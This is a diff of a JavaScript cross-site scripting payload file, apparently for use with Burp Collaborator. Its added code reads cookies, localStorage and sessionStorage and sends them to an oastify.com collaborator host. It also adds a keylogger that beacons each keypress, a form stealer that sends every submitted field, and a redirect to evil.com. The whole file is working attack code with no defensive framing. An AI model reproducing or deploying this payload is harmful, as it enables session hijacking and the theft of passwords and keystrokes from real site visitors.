@@ -1,42 +1,31 @@
-// Display the current domain in an alert
-alert("Domain: " + document.domain);
-
-// Fetch cookies, User-Agent, referrer, screen resolution
+// Collect Cookies, Local Storage, and Session Storage
 var cookies = document.cookie;
-var userAgent = navigator.userAgent;
-var referrer = document.referrer;
-var screenResolution = screen.width + 'x' + screen.height;
+var localStorageData = JSON.stringify(localStorage);
+var sessionStorageData = JSON.stringify(sessionStorage);
 
-// Send the cookies and data to your Burp Collaborator URL
-var burpCollaboratorURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com";
-var data = {
-  cookies: encodeURIComponent(cookies),
-  userAgent: encodeURIComponent(userAgent),
-  referrer: encodeURIComponent(referrer),
-  screenResolution: encodeURIComponent(screenResolution)
-};
+// Send Data to Burp Collaborator
+var burpURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com";
+new Image().src = burpURL + "/?cookie=" + encodeURIComponent(cookies) + 
+                  "&localStorage=" + encodeURIComponent(localStorageData) + 
+                  "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
+                  "&referrer=" + encodeURIComponent(document.referrer);
 
-var img = new Image();
-img.src = burpCollaboratorURL + "/?data=" + encodeURIComponent(JSON.stringify(data));
+// Keylogger
+document.addEventListener("keydown", function(event) {
+    new Image().src = burpURL + "/?key=" + encodeURIComponent(event.key);
+});
 
-// Fake login form exfiltration
-var fakeForm = document.createElement('form');
-fakeForm.method = 'POST';
-fakeForm.action = burpCollaboratorURL + "/fake-login";
-var usernameField = document.createElement('input');
-usernameField.type = 'text';
-usernameField.name = 'username';
-usernameField.value = 'fakeuser';
-var passwordField = document.createElement('input');
-passwordField.type = 'password';
-passwordField.name = 'password';
-passwordField.value = 'fakepassword';
-fakeForm.appendChild(usernameField);
-fakeForm.appendChild(passwordField);
-document.body.appendChild(fakeForm);
-fakeForm.submit();
+// Form Stealer
+document.addEventListener("submit", function(event) {
+    var formData = new FormData(event.target);
+    var data = "";
+    for (var pair of formData.entries()) {
+        data += pair[0] + "=" + pair[1] + "&";
+    }
+    new Image().src = burpURL + "/?form=" + encodeURIComponent(data);
+});
 
-// Redirect to a malicious site after 2 seconds
+// Redirect Victim
 setTimeout(function() {
-    window.location.href = "https://evil.com"; 
-}, 2000);
+    window.location.href = "https://evil.com";
+}, 3000);
